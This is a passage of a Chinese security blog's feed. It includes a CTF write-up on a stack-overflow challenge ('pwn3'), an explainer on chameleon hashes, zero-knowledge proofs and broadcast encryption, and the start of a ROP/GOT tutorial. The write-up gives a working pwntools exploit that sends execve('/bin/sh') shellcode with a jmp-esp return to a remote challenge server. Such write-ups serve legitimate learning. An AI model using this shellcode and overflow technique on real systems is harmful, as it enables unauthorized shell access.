中的#if、#elif、#else、#endif、#define、#undef等预处理器指令</a></li><li><a href="https://blog.csdn.net/wwwsssZheRen/article/details/79077141" target="_blank" rel="noopener">C语言中#if 0，#if 1，#else，#endif的作用</a></li><li><a href="https://blog.csdn.net/t55p318/article/details/77602164" target="_blank" rel="noopener">C#中 #if #endif的使用</a></li><li><a href="https://blog.csdn.net/mm_hh/article/details/71374474" target="_blank" rel="noopener">Linux下 文件描述符（fd）与 文件指针（FILE*）</a>(待看)</li><li><a href="[https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F](https://zh.wikipedia.org/wiki/操作系统">操作系统</a> )</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、知识点摘要&quot;&gt;&lt;a href=&quot;#一、知识点摘要&quot; class=&quot;headerlink&quot; title=&quot;一、知识点摘要&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、知识点摘要&lt;/font&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;系统调用
      
    
    </summary>
    
    
      <category term="内核" scheme="https://muzibing.github.io/tags/%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>PWN 实战 - shellcode 题解</title>
    <link href="https://muzibing.github.io/2019/10/16/2019.10.16%EF%BC%8886%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/10/16/2019.10.16（86）/</id>
    <published>2019-10-15T16:00:00.000Z</published>
    <updated>2019-11-05T06:06:25.207Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a><font color="brown">一、基础知识</font></h3><h4 id="1-shellcode"><a href="#1-shellcode" class="headerlink" title="1.shellcode"></a><font color="navy">1.shellcode</font></h4><blockquote><p>有关 shellcode 的知识介绍，在这里我就不过多的介绍了，给大家附上几个我认为写的比较好的博文：</p><blockquote><ul><li><a href="https://www.zhihu.com/question/30943194" target="_blank" rel="noopener">shellcode原理是啥？</a></li><li><a href="https://yq.aliyun.com/articles/58699" target="_blank" rel="noopener"> 一步一步学ROP之linux_x86篇 </a></li><li><a href="https://blog.csdn.net/qq_35495684/article/details/79583232?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">PWN-shellcode获取与编写</a></li><li><a href="https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/" target="_blank" rel="noopener">渗透中PoC、Exp、Payload与Shellcode的区别</a></li></ul></blockquote></blockquote><h3 id="二、解题步骤"><a href="#二、解题步骤" class="headerlink" title="二、解题步骤"></a><font color="brown">二、解题步骤</font></h3><h4 id="1-查看文件类型"><a href="#1-查看文件类型" class="headerlink" title="1,查看文件类型"></a><font color="navy">1,查看文件类型</font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file pwn3</span><br></pre></td></tr></table></figure><p>6<img src="/images/86-9.jpg" alt></p><blockquote><p>从上面的结果可以得出，该文件是一个 <code>32</code> 位的 ELF 文件</p></blockquote><h4 id="2-查看-pwn3-开启的保护"><a href="#2-查看-pwn3-开启的保护" class="headerlink" title="2.查看 pwn3 开启的保护"></a><font color="navy">2.查看 pwn3 开启的保护</font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn3</span><br></pre></td></tr></table></figure><p><img src="/images/86-10.jpg" alt></p><blockquote><p>从上图可以得出，pwn3 没有开启<code>栈保护</code>功能，没有开启<code>ASLR</code>，开启了<code>栈上数据可执行</code>，开启了<code>RELRO</code>，意味着我们可以对 GOT 进行写的权限。</p></blockquote><h4 id="3-寻找漏洞"><a href="#3-寻找漏洞" class="headerlink" title="3.寻找漏洞"></a><font color="navy">3.寻找漏洞</font></h4><blockquote><p>我们用 <code>IDA-32</code> 打开 <code>pwn3</code> ，通过对程序的观察我们发现在函数 <code>sub_804851A()</code> 中可能产生溢出漏洞：</p><p><img src="/images/86-11.jpg" alt></p><p>从上图可以看到：</p><ul><li>在栈中给 buf 的实际大小为：ebp - 0x1Ch（十进制：28）</li><li>用户实际能输入的数据大小为：0x100h（十进制：256）</li></ul><p>所以在这里会产生栈溢出，我们也就可以利用该漏洞获取 <code>flag</code></p></blockquote><h4 id="4-利用漏洞"><a href="#4-利用漏洞" class="headerlink" title="4.利用漏洞"></a><font color="navy">4.利用漏洞</font></h4><blockquote><p>在这道题中，因为大多数保护都没有开启，所以我们可以有多种构思思路：</p><ul><li>通过 libc 库来泄露 <code>system()</code> 的地址，这和 <code>ROP</code> 那道题的思路差不多</li><li>在缓冲区中填写我们构造的 <code>shellcode</code>，再通过返回 <code>shellcode</code> 的地址，来执行 <code>shellcode</code> ，获取系统调用权</li></ul><p>这里我们主要以第二种思路来讲解</p></blockquote><h4 id="5-分析思路"><a href="#5-分析思路" class="headerlink" title="5.分析思路"></a><font color="navy">5.分析思路</font></h4><blockquote><p>首先我们先来看一下这个栈中的情况：</p><p><img src="/images/86-1.jpg" alt></p><p>通过上面的情况，我们可以知道：</p><ul><li>填充的数据为：0x1c + 0x4 = 32</li><li>在返回地址这里，我们有多种返回方式：<ul><li>我们可以直接返回 <code>buf</code> 的首地址</li><li>我们也可以将地址返回到高地址中的参数，然后通过控制esp，再执行 <code>shellcode</code></li><li>……</li></ul></li></ul><p>通过上面的分析，我们可以大概知道自己的 <code>payload</code> 了：</p><font color="red"><center>payload = shellcode + 'a' * 32 - len(shellcode) + p32(jmp_exp) + jmp_shellcode</center></font><p>具体的执行如下：</p><p><img src="/images/85-1.gif" alt></p></blockquote><h4 id="6-编写-exp"><a href="#6-编写-exp" class="headerlink" title="6.编写 exp"></a><font color="navy">6.编写 exp</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9992</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">"\x31\xc0\x31\xd2\x52\x68\x2f\x2f'</span></span><br><span class="line"><span class="string">shellcode += '\x73\x68\x68\x2f\x62\x69\x6e\x89</span></span><br><span class="line"><span class="string">shellcode += '\xe3\x31\xc9\xb0\x0b\xcd\x80'</span></span><br><span class="line"><span class="string">shellcode_jmp = asm('sub esp,0x24;jmp esp')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = shellcode + (32-len(shellcode))*'a' + p32(0x08048667) + shellcode_jmp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.send(payload)</span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure><h4 id="7-获取-flag"><a href="#7-获取-flag" class="headerlink" title="7.获取 flag"></a><font color="navy">7.获取 flag</font></h4><p><img src="/images/86-12.jpg" alt></p><h3 id="三、相关问题"><a href="#三、相关问题" class="headerlink" title="三、相关问题"></a><font color="brown">三、相关问题</font></h3><blockquote><ol><li>返回到 buf 的起始地址后，为什么能够执行 shellcode？</li><li>sendline() 和 send() 的区别是什么？</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、基础知识&quot;&gt;&lt;a href=&quot;#一、基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、基础知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-shellcode&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>变色龙哈希（Chameleon Hash）、零知识证明（Zero—Knowledge Proof）和广播加密相关知识</title>
    <link href="https://muzibing.github.io/2019/10/12/2019.10.12%EF%BC%8885%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/10/12/2019.10.12（85）/</id>
    <published>2019-10-11T16:00:00.000Z</published>
    <updated>2019-11-05T04:23:38.727Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、变色龙哈希（Chameleon-Hash）"><a href="#一、变色龙哈希（Chameleon-Hash）" class="headerlink" title="一、变色龙哈希（Chameleon Hash）"></a><font color="brown">一、变色龙哈希（Chameleon Hash）</font></h3><h4 id="1-哈希函数？"><a href="#1-哈希函数？" class="headerlink" title="1.哈希函数？"></a><font color="navy">1.哈希函数？</font></h4><blockquote><font color="orage">**① 什么是哈希函数？**</font><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;哈希函数又叫 Hash、one-way function、单向散列函数等，它是一种可以<font color="red">将任意长度输入的字串可转换成一个固定长度的字串，通过原始字串可以很容易地算出转换后的字串，通过转换后的字串很难还原出原始字串。</font></p><p><br><font color="orage"><strong>② 哈希函数的特征</strong></font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.对于任意m作为输入，得到输出的结果，很难找到另一个输入m’  （m’不等于m），使得m’的Hash结果也为同样的输出，即Hash(m) = Hash(m’)。这一性质成为广义碰撞抵抗性。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2. 进一步，很难找到任意两个m和m’，使得Hash(m) = Hash(m’)。这里我们没有固定的m和m’，因此这一要求比第一个要求更为严格。这一性质成为严格碰撞抵抗性。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.抗篡改能力，对于一个数据块，哪怕只改动其一个比特位，其hash值的改动也会非常大。</p></blockquote><h4 id="2-变色龙哈希函数"><a href="#2-变色龙哈希函数" class="headerlink" title="2.变色龙哈希函数"></a><font color="navy">2.变色龙哈希函数</font></h4><blockquote><font color="orage">**① 什么是变色龙哈希函数**</font><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Chameleon Hash 是一类特殊的 Hash 函数，对于绝大多数使用者，其同样满足 Hash 的碰撞抵抗性。然而，如果某个人知道 Chameleon Hash 的一些秘密（我们用sk表示），其可以非常容易破坏Hash的碰撞抵抗性。也就是说，对于任意 m，其很容易能够找到 m’ \\neq m，使得ChameleonHash(m’) = ChameleonHash(m)。这似乎破坏了Hash的碰撞抵抗性，但是在绝大多数使用者来说，其还是安全的Hash。</p><p><br><font color="orage"><strong>② 变色龙哈希函数的特点</strong></font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ChameleonHash(m) = ChameleonHash(m‘)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>注释：m 和 m’ 分别代表两个不同的明文</strong></p><p><br><font color="orage"><strong>③ 变色龙哈希函数的原理</strong></font></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假设有一个明文为 <code>m</code>，<font color="red">Alice</font> 用变色龙哈希函数计算 <code>m</code> 的哈希值，计算步骤如下：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ Alice 随机选取一个指数 x，这个 x 被称为 <strong>私钥</strong> 或者 <strong>后门 </strong>&nbsp;☛ (sk = x)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ Alice 计算所对应的<strong>公钥</strong>：h = g<sup>x</sup> &nbsp;☛(pk = （g,h))</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 生成变色龙哈希对应的随机数 <code>r</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 计算明文 <code>m</code> 的相关哈希值：C_H = g<sup>m</sup>&nbsp;<em> h<sup>r</sup> = g<sup>m</sup> </em> g<sup>xr</sup> = g<sup>m+xr</sup></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Alice 就把所得到的 Chameleon Hash 值发给了 Bob，在发送的路上这个值被 Attacker 截取了，攻击者想把明文消息进行篡改，但得到相同的 ChameleonHash ，这就是找变色龙哈希函数值的碰撞，实验过程如下：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>※</strong> 攻击者构造想要构造一个明文 <code>m&#39;</code>，使得：</p><p><center>g<sup>m+xr</sup> = g<sup>m'+xr'</sup></center><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也就是 <code>m + xr = m&#39; + xr&#39;</code>  ——&gt; <code>m&#39; = m + xr - xr&#39;</code> ，在这里可以随意构造一个明文 <code>m&#39;</code>， 使得 <code>C_H = C_H&#39;</code> ，但就必须要找出一个 <code>r&#39;</code> 满足上述关系式：r’ = $  \frac {m+xr-m’}{x} $，在这里 <code>m&#39;、m、r</code> 已知，但是 x 是 Alice 的密钥，所以攻击者无法成功构造一个 <code>C_H&#39; = C_H</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>总结</strong>：因为对于其他人来说，其不知道 x 的值，因此，如果想构造出一个碰撞，其他人必须在指数上面解方程 g<sup>m + xr</sup> = g<sup>m’ + xr‘</sup>，也就是说去求一个<font color="red"><strong>离散对数问题</strong></font>。但是，离散对数问题直到现在为止都没有一个很快的算法（最快也是指数级的）。因此对于其他人来说，很难找到碰撞。</p><p><br></p><font color="orage">**④ 变色龙哈希函数的应用实例**</font><blockquote><p>假设小明和小红达成协议，小明将家族产业10%股份转让给小红。签了合同小名很担心啊，如果小红把这件事告诉别人怎么办？这时候就可以用变色龙函数进行签名。小红生成一个只有她才能找到碰撞的函数交给小明，小明再用这个函数来签电子文档。这下小红把签名后的文件丢给大家也没人相信她了。为什么呢？她掌握着哈希函数的弱点，可以随便生成哈希碰撞啊。她把10%股份改成99%都能保证哈希不会变，进而创造出新文件本来就是小明签的这种假象。因此出自小红之手的文件可信度为零。<strong>这个特性叫non-transferability，即两者之间达成的信任不能转到第三方。</strong></p><p>“你知道的太多了” 此时此刻成了真正的包袱。</p><p>问题来了，小明抵赖怎么破？如果小明死死咬定转让10%股份是小红伪造，事实上只有1%呢？事实上小明也不能信口开河，他得提供对应的证据。证据就是哈希碰撞。假设双方达成的最初合同是A，而小红将其篡改成了相同哈希的A’，那么小明看到A’这份伪证之后一定能拿出最早那个A来并表明A和A’形成哈希碰撞，否则A’就是真货了。因为正常情况下小明无论如何也找不到碰撞，他就不能抵赖。<strong>这个特性叫non-repudiation。</strong></p><p>————————————————</p><p>☛ 注：引用知乎用户<a href="https://www.zhihu.com/people/yifei.teng/activities" target="_blank" rel="noopener">@滕亦飞</a>的回答</p><p>原文链接： <a href="https://www.zhihu.com/question/38545889" target="_blank" rel="noopener">https://www.zhihu.com/question/38545889</a> </p></blockquote><p><br></p><font color="orage">**⑤ 变色龙哈希函数的攻击案例**</font><blockquote><p>如果某个网站中密码验证的Hash是这么计算的，而这个网站自己本身有Hash所对应的sk，那么，网站自身就可以伪造所有的密码，来窃取用户数据了。所以，有些时候我们需要怀疑一下一些声称安全的网站到底是不是有后门的。即使说是使用Hash验证，或者加上这样那样的功能来进一步提高安全性，但是如果有这样的后门，对于用户来说还是无能为力的。<br>————————————————<br>☞ 注：引用于CSDN用户@ <a href="https://me.csdn.net/u013590498" target="_blank" rel="noopener">刘巍然-BUAA</a> 的博文<br>原文链接：<a href="https://blog.csdn.net/liuweiran900217/article/details/21819637" target="_blank" rel="noopener">https://blog.csdn.net/liuweiran900217/article/details/21819637</a></p></blockquote></blockquote><h4 id="3-对哈希函数重要的误区"><a href="#3-对哈希函数重要的误区" class="headerlink" title="3.对哈希函数重要的误区"></a><font color="navy">3.对哈希函数重要的误区</font></h4><blockquote><p><strong>哈希函数计算出哈希值的过程不是一个加密过程</strong>，所以不能说<strong>哈希加密/哈希解密</strong>之类的话。</p></blockquote><h3 id="二、零知识证明"><a href="#二、零知识证明" class="headerlink" title="二、零知识证明"></a><font color="brown">二、零知识证明</font></h3><h4 id="1-什么是零知识证明？"><a href="#1-什么是零知识证明？" class="headerlink" title="1.什么是零知识证明？"></a><font color="navy">1.什么是零知识证明？</font></h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;它指的是证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的。零知识证明实质上是一种涉及两方或更多方的协议，即两方或更多方完成一项任务所需采取的一系列步骤。证明者向验证者证明并使其相信自己知道或拥有某一消息，但证明过程不能向验证者泄漏任何关于被证明消息的信息。顾名思义，零知识证明就是既能充分证明自己是某种权益的合法拥有者，又不把有关的信息泄露出去——即给外界的“知识”为“零”。 </p></blockquote><h4 id="2-零知识满足的性质"><a href="#2-零知识满足的性质" class="headerlink" title="2.零知识满足的性质"></a><font color="navy">2.零知识满足的性质</font></h4><blockquote><p><strong>(1)正确性</strong>。P无法欺骗V。换言之，若P不知道一个定理的证明方法，则P使V相信他会证明定理的概率很低。</p><p><strong>(2)完备性</strong>。V无法欺骗P。若P知道一个定理的证明方法，则P使V以绝对优势的概率相信他能证明。</p><p><strong>(3)零知识性</strong>。V无法获取任何额外的知识。</p></blockquote><h4 id="3-零知识的属性"><a href="#3-零知识的属性" class="headerlink" title="3.零知识的属性"></a><font color="navy">3.零知识的属性</font></h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;零知识证明需要满足三个属性：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、如果语句为真，诚实的验证者（即：正确遵循协议的验证者）将由诚实的证明者确信这一事实。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、如果语句为假，不排除有概率欺骗者可以说服诚实的验证者它是真的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、如果语句为真，证明者的目的就是向验证者证明并使验证者相信自己知道或拥有某一消息，而在证明过程中不可向验证者泄漏任何有关被证明消息的内容。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;零知识证明并不是数学意义上的证明，因为它存在小概率的误差，欺骗者有可能通过虚假陈述骗过证明者。换句话来说，零知识证明是概率证明而不是确定性证明。但是也存在有技术能将误差降低到可以忽略的值。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;零知识的形式定义必须使用一些计算模型，最常见的是图灵机的计算模型。</p></blockquote><h4 id="4-零知识的例子"><a href="#4-零知识的例子" class="headerlink" title="4.零知识的例子"></a><font color="navy">4.零知识的例子</font></h4><blockquote><p>1.A要向B证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。这时有2个方法：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① A把钥匙出示给B，B用这把钥匙打开该房间的锁，从而证明A拥有该房间的正确的钥匙。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② B确定该房间内有某一物体，A用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给B，从而证明自己确实拥有该房间的钥匙。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后面的②方法属于零知识证明。它的好处在于，在整个证明的过程中，B始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><p><br>2.A拥有B的公钥，A没有见过B，而B见过A的照片，偶然一天两个人见面了，B认出了A，但A不能确定面前的人是否是B，这时B要向A证明自己是B，也有2个方法。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① B把自己的私钥给A，A用公钥对某个数据加密，然后用B的私钥解密，如果正确，则证明对方确实是B。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② A给出一个随机值，并使用B的公钥对其加密，然后将加密后的数据交给B，B用自己的私钥解密并展示给A，如果与A给出的随机值相同，则证明对方是B。</p><p>后面的方法属于零知识证明。</p><p><br>3.有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A要向B证明自己拥有该门的钥匙。采用零知识证明，则B看着A从入口进入走廊，然后又从出口走出走廊，这时B没有得到任何关于这个钥匙的信息，但是完全可以证明A拥有钥匙。</p></blockquote><h3 id="三、广播加密"><a href="#三、广播加密" class="headerlink" title="三、广播加密"></a><font color="brown">三、广播加密</font></h3><h4 id="1-什么是广播加密？"><a href="#1-什么是广播加密？" class="headerlink" title="1.什么是广播加密？"></a><font color="navy">1.什么是广播加密？</font></h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 广播加密是一种在不安全信道上给一组用户传输加密信息的密码体制，它可使发送者选取任意用户集合进行广播加密，只有授权用户才能够解密密文。广播加密有着广泛的实际应用背景，例如，<strong>数字版权管理、付费电视、卫星广播通信</strong>等。一个广播加密方案满足完全抗同谋攻击（fully collusion resistant），即所有撤销用户合作，也无法解密密文。对于一个公钥广播加密方案，用户私钥长度、系统公钥长度、密文长度以及加密解密计算复杂度是衡量性能优劣的重要标准。 </p></blockquote><h3 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a><font color="brown">四、参考文章</font></h3><ul><li><a href="https://blog.csdn.net/jerry81333/article/details/76141596" target="_blank" rel="noopener">变色龙哈希函数 Chameleon Hash 可变型区块链</a></li><li><a href="https://blog.csdn.net/liuweiran900217/article/details/21819637" target="_blank" rel="noopener">Cryptography - Chameleon Hash</a></li><li><a href="https://www.zhihu.com/question/38545889" target="_blank" rel="noopener">变色龙哈希函数是什么？</a></li><li><a href="https://baike.baidu.com/item/零知识证明" target="_blank" rel="noopener">零知识证明</a></li><li><a href="https://zhuanlan.zhihu.com/p/24440530" target="_blank" rel="noopener">不是程序员也能看懂的ZCash零知识证明</a></li><li><a href="https://www.leiphone.com/news/201803/egFu5MwIsweBU2WY.html" target="_blank" rel="noopener">零知识证明（Zero-Knowledge Proof）原理详解：非交互式证明实现自动验证防止作假</a></li><li><a href="https://blog.csdn.net/sxjinmingjie/article/details/77746232" target="_blank" rel="noopener">区块链解读-零知识证明</a></li><li><a href="https://www.jiamisoft.com/blog/3400-guangbojiami.html" target="_blank" rel="noopener">广播加密</a></li><li><a href="https://crypto.stackovernet.com/cn/q/5241" target="_blank" rel="noopener">误解广播加密</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、变色龙哈希（Chameleon-Hash）&quot;&gt;&lt;a href=&quot;#一、变色龙哈希（Chameleon-Hash）&quot; class=&quot;headerlink&quot; title=&quot;一、变色龙哈希（Chameleon Hash）&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brow
      
    
    </summary>
    
    
      <category term="密码学" scheme="https://muzibing.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>pwn-ROP(GOT表泄露)</title>
    <link href="https://muzibing.github.io/2019/10/08/2019.09.28%EF%BC%8884%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/10/08/2019.09.28（84）/</id>
    <published>2019-10-07T16:00:00.000Z</published>
    <updated>2019-10-08T02:26:39.559Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a><font color="brown">一、基础知识</font></h3><h4 id="1-GOT-表、PLT-表和-libc-库的相关知识"><a href="#1-GOT-表、PLT-表和-libc-库的相关知识" class="headerlink" title="1.GOT 表、PLT 表和 libc 库的相关知识"></a><font color="navy">1.GOT 表、PLT 表和 libc 库的相关知识</font></h4><font color="red">① 什么是 GOT 表？</font><blockquote><p>GOT(Global Offset Table) 表，即<strong>全局偏移量表</strong>，里面是函数在 libc 库中的绝对地址。</p></blockquote><font color="red">② 什么是 PLT 表？</font><blockquote><p>PLT(Procedure Link Table) 表，即<strong>程序链接表</strong>，里面是函数在 GOT 表中的地址。</p></blockquote><font color="red">③ 什么是 libc 库？</font><blockquote><p><strong>libc是Linux下的ANSI C的函数库</strong>。ANSI C是基本的C语言函数库，包含了C语言最基本的<a href="https://baike.baidu.com/item/库函数" target="_blank" rel="noopener">库函数</a>。这个库可以根据 头文件划分为 15 个部分，其中包括：字符类型 ()、<a href="https://baike.baidu.com/item/错误码" target="_blank" rel="noopener">错误码</a>()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 () 等等。这在其他的C语言的IDE中都是有的。（来源百度百科词条）</p></blockquote><font color="red">④ GOT、PLT 和 libc 库的联系</font><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_banner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to World of PLT and GOT\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">"/tmp/text"</span>,File);</span><br><span class="line">    write(fd,<span class="keyword">void</span> *buf,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">write_file();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如上图所示， write_file 函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，假设上述的示例 test 在运行过程中，调用方（如 print_banner 和 write_file )是如何通过 PLT 和 GOT 穿针引线之后，最终调用到 glibc 的 printf 和 write 函数的？</p><p><img src="/images/84-1.jpg" alt></p></blockquote><h4 id="2-重定位"><a href="#2-重定位" class="headerlink" title="2.重定位"></a><font color="navy">2.重定位</font></h4><blockquote><p>重定位就是把程序的<a href="https://baike.baidu.com/item/逻辑地址空间/5624042" target="_blank" rel="noopener">逻辑地址空间</a>变换成内存中的实际<a href="https://baike.baidu.com/item/物理地址/2129" target="_blank" rel="noopener">物理地址</a>空间的过程。它是实现<a href="https://baike.baidu.com/item/多道程序/8192392" target="_blank" rel="noopener">多道程序</a>在内存中同时运行的基础。重定位有两种，分别是<a href="https://baike.baidu.com/item/动态重定位/9849090" target="_blank" rel="noopener">动态重定位</a>与<a href="https://baike.baidu.com/item/静态重定位/8785916" target="_blank" rel="noopener">静态重定位</a>。</p><p>① <a href="https://baike.baidu.com/item/静态重定位" target="_blank" rel="noopener">静态重定位</a>：即在程序装入内存的过程中完成，是指在程序开始运行前，程序中的各个地址有关的项均已完成重定位，地址变换通常是在装入时一次完成的，以后不再改变，故成为静态重定位。</p><p>② <a href="https://baike.baidu.com/item/动态重定位" target="_blank" rel="noopener">动态重定位</a>：它不是在程序装入内存时完成的，而是CPU每次访问内存时 由<a href="https://baike.baidu.com/item/动态地址" target="_blank" rel="noopener">动态地址</a>变换机构（硬件）自动进行把相对地址转换为<a href="https://baike.baidu.com/item/绝对地址" target="_blank" rel="noopener">绝对地址</a>。动态重定位需要软件和硬件相互配合完成。</p><p>（以上来源百度百科词条）</p><p>关于重定位的还有以下几篇文章：</p><p><a href="https://blog.csdn.net/cherisegege/article/details/80708143" target="_blank" rel="noopener">① 什么是重定位？为什么需要重定位？</a> 强烈推荐看一下，因为通过这篇文章又引入了几个概念和问题：</p><blockquote><p>概念 1：链接地址和运行地址</p><p>概念 2：位置有关码与位置无关码</p><p>问题 1：链接地址跟运行地址不同的情况下会出现什么情况？</p><p>问题 2：为什么会出现链接地址跟运行地址不同的情况？</p><p>问题 3：什么是重定位？</p><p>问题 4：为什么需要重定位？</p></blockquote><p><a href="https://segmentfault.com/a/1190000016433947" target="_blank" rel="noopener">② 彻底理解链接器：四，重定位</a></p></blockquote><h3 id="3-延迟绑定"><a href="#3-延迟绑定" class="headerlink" title="3.延迟绑定"></a><font color="navy">3.延迟绑定</font></h3><blockquote><p>关于延迟绑定的相关内容与动态链接有者密不可分的联系，我只简单地介绍一下延迟绑定的目的和实现原理。</p><font color="red">① 延迟绑定的目的</font><p>&nbsp;&nbsp;&nbsp;&nbsp;第一次调用函数时，由连接器负责重定位，第二次调用函数时直接调用，不必经过连接器。</p><font color="red">② 